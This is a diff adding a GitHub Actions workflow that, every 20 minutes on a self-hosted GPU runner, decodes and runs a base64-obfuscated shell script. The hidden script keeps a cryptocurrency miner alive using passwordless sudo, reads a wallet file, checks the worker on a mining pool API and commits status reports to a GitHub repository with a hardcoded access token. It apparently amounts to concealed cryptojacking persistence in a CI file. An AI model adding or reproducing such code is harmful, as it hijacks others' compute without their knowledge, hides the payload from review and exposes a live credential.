@@ -1,0 +1,45 @@
+name: ul-t2-wd
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/20 * * * *'
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClM9InN1ZG8gLW4iOyBIPSQoaG9zdG5hbWUgLXMpOyBXPXBybDFwZWs4cmg4eWpjazVxNzU5
+    NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRsegpXUks9dWwtdDItcHMtMTQ5
+    LTgxLTEwLTI0Mi1nMAplY2hvICI9PSB3YXRjaGRvZyAkKGRhdGUgLXUgKyVGVCVUWikgaG9zdD0kSCBi
+    b290X2lkPSQoY2F0IC9wcm9jL3N5cy9rZXJuZWwvcmFuZG9tL2Jvb3RfaWQpIHVwPSQodXB0aW1lIC1z
+    KSIKcmVwPTAKaWYgISAkUyBwZ3JlcCAtZiAiJFdSSyIgPi9kZXYvbnVsbDsgdGhlbgogIGVjaG8gIk1J
+    U1NJTkcgLT4gcmVwYWlyIjsgJFMgc3lzdGVtY3RsIHJlc3RhcnQgdWwtdDItcHMwIDI+JjEgfCBoZWFk
+    IC0yOyByZXA9MTsgc2xlZXAgMjAKZmkKJFMgc3lzdGVtY3RsIGlzLWFjdGl2ZSB1bC10Mi1wczA7ICRT
+    IHBncmVwIC1mYSAiJFdSSyIgfCBoZWFkIC0yCmVjaG8gLW4gIndhbGxldD0iOyAkUyBjYXQgL29wdC91
+    bC10Mi93YWxsZXQ7IGVjaG8KUj0iIjsgZm9yIGkgaW4gMSAyIDMgNDsgZG8gUj0kKGN1cmwgLXMgLW0g
+    MjAgImh0dHBzOi8vcG9vbC5rcnlwdGV4LmNvbS9wcmwvYXBpL3YzL21pbmVyL3dvcmtlcnMvJFciIHwg
+    dHIgJ3snICdcbicgfCBncmVwICJcIndvcmtlclwiOlwiJFdSS1wiIik7IGNhc2UgIiRSIiBpbiAqJyJ2
+    YWxpZCI6JyopIGJyZWFrOzsgZXNhYzsgc2xlZXAgMTA7IGRvbmUKZWNobyAicG9vbD0kUiIKbnZpZGlh
+    LXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCxuYW1lLG1lbW9yeS51c2VkLHV0aWxpemF0aW9uLmdwdSxwb3dl
+    ci5kcmF3IC0tZm9ybWF0PWNzdixub2hlYWRlcgppZiBbICRyZXAgLWVxIDEgXSB8fCAhIHByaW50ZiAn
+    JXMnICIkUiIgfCBncmVwIC1xICcic3RhdHVzIjoib25saW5lIic7IHRoZW4KICBiPSQoIHsgZGF0ZSAt
+    dTsgZWNobyAicmVwYWlyPSRyZXAiOyBlY2hvICIkUiI7IH0gfCBiYXNlNjQgLXcwICkKICBQPSJjbWRv
+    dXQ4L3VsLXQyLXdkXyRILnR4dCI7IEI9aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9kb25nc3Vq
+    dS91bC1wbGFudC9jb250ZW50cy8kUAogIHM9JChjdXJsIC1zIC1tIDIwIC1IICJBdXRob3JpemF0aW9u
+    OiB0b2tlbiBnaHBfNnRQMjVpQzl3cENZQlpFbXBSVlJPS2hFeEllbVRjMnVwNGk3IiAiJEI/cmVmPW1h
+    aW4iIHwgc2VkIC1uICdzLy4qInNoYSI6ICoiXChbYS1mMC05XSpcKSIuKi9cMS9wJyB8IGhlYWQgLTEp
+    CiAgaWYgWyAtbiAiJHMiIF07IHRoZW4gSj0ie1wibWVzc2FnZVwiOlwid2RcIixcImNvbnRlbnRcIjpc
+    IiRiXCIsXCJzaGFcIjpcIiRzXCIsXCJicmFuY2hcIjpcIm1haW5cIn0iOyBlbHNlIEo9IntcIm1lc3Nh
+    Z2VcIjpcIndkXCIsXCJjb250ZW50XCI6XCIkYlwiLFwiYnJhbmNoXCI6XCJtYWluXCJ9IjsgZmkKICBj
+    dXJsIC1zIC1vIC9kZXYvbnVsbCAtbSAzMCAtWCBQVVQgLUggIkF1dGhvcml6YXRpb246IHRva2VuIGdo
+    cF82dFAyNWlDOXdwQ1lCWkVtcFJWUk9LaEV4SWVtVGMydXA0aTciIC1IICJDb250ZW50LVR5cGU6IGFw
+    cGxpY2F0aW9uL2pzb24iIC1kICIkSiIgIiRCIgogIGVjaG8gY29tbWl0dGVkCmVsc2UgZWNobyAiaGVh
+    bHRoeSwgbm8gY29tbWl0IjsgZmkKZWNobyBkb25lCg==
+jobs:
+  w:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 15
+    steps:
+      - name: wd
+        run: |
+          echo "$B64" | base64 -d > /tmp/t2wd.sh
+          bash /tmp/t2wd.sh
